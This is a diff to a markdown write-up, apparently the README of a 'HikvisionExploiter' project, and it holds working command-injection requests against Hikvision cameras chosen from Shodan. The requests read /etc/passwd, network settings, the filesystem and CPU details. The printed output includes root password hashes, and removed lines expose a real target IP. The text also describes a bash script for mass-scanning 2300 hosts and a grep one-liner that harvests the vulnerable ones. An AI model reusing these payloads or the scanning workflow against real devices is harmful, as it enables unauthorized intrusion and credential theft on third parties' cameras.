@@ -48,21 +48,21 @@ Initial exploitation began by selecting targets from Shodan search results using
 
 ### Basic Enumerating On a random target:
 
-```
+```bash
  ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 0s
- ╰─λ curl -s -X PUT "http://46.40.125.228:82/SDK/webLanguage" \
+ ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
            --data '<?xml version="1.0" encoding="UTF-8"?><language>$(cat /etc/passwd > webLib/x)</language>' \
-           > /dev/null && curl -s "http://46.40.125.228:82/x"
+           > /dev/null && curl -s "http://IP:82/x"
 
 root:$1$yi$R2PYdRrGOlLVVIaehmYwl.:0:0:root:/root/:/bin/sh
 admin:$1$yi$R2PYdRrGOlLVVIaehmYwl.:0:0:root:/:/bin/sh
 
  ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 1s
- ╰─λ curl -s -X PUT "http://46.40.125.228:82/SDK/webLanguage" \
+ ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
            --data '<?xml version="1.0" encoding="UTF-8"?><language>$(ifconfig > webLib/x)</language>' \
-           > /dev/null && curl -s "http://46.40.125.228:82/x"
+           > /dev/null && curl -s "http://IP:82/x"
 
 eth0      Link encap:Ethernet  HWaddr 28:57:BE:5E:0E:7F  
           inet addr:192.168.1.65  Bcast:192.168.1.255  Mask:255.255.255.0
@@ -85,10 +85,10 @@ lo        Link encap:Local Loopback
 
 
  ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 1s
- ╰─λ curl -s -X PUT "http://46.40.125.228:82/SDK/webLanguage" \
+ ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
            --data '<?xml version="1.0" encoding="UTF-8"?><language>$(ls / > webLib/x)</language>' \
-           > /dev/null && curl -s "http://46.40.125.228:82/x"
+           > /dev/null && curl -s "http://IP:82/x"
 
 bin
 dav
@@ -110,18 +110,18 @@ tmp
 var
 
  ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 6s
- ╰─λ curl -s -X PUT "http://46.40.125.228:82/SDK/webLanguage" \
+ ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
            --data '<?xml version="1.0" encoding="UTF-8"?><language>$(cat /proc/version > webLib/x)</language>' \
-           > /dev/null && curl -s "http://46.40.125.228:82/x"
+           > /dev/null && curl -s "http://IP:82/x"
 
 Linux version 3.0.8 (huangliangyf2@Cpl-Frt-BSP) #1 Fri Mar 20 20:52:46 CST 2015
 
  ╭─hex@space in repo: HikvisionExploiter on  main [!?] via  v3.13.5 took 4s
- ╰─λ curl -s -X PUT "http://46.40.125.228:82/SDK/webLanguage" \
+ ╰─λ curl -s -X PUT "http://IP:82/SDK/webLanguage" \
            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
            --data '<?xml version="1.0" encoding="UTF-8"?><language>$(cat /proc/cpuinfo > webLib/x)</language>' \
-           > /dev/null && curl -s "http://46.40.125.228:82/x"
+           > /dev/null && curl -s "http://IP:82/x"
 
 Processor	: ARM926EJ-S rev 5 (v5l)
 BogoMIPS	: 218.72
@@ -148,7 +148,7 @@ Serial		: 0000000000000000
 
 As we have a list of 2300 hosts, it would be insanity to test it manually, so we will use an automation optimized for speed bash script to test the vulnerable ones.
 
-```
+```bash
 #!/bin/bash
 
 # function to process each IP:PORT
@@ -197,7 +197,7 @@ echo "all scans completed"
 
 #### Automated Bash One Liner for grepping the clear results from the XML non-sense
 
-```
+```bash
 ./final.sh | grep "root:" -B 2 -A 1 > finalvulnerablercehosts.txt
 ```
 
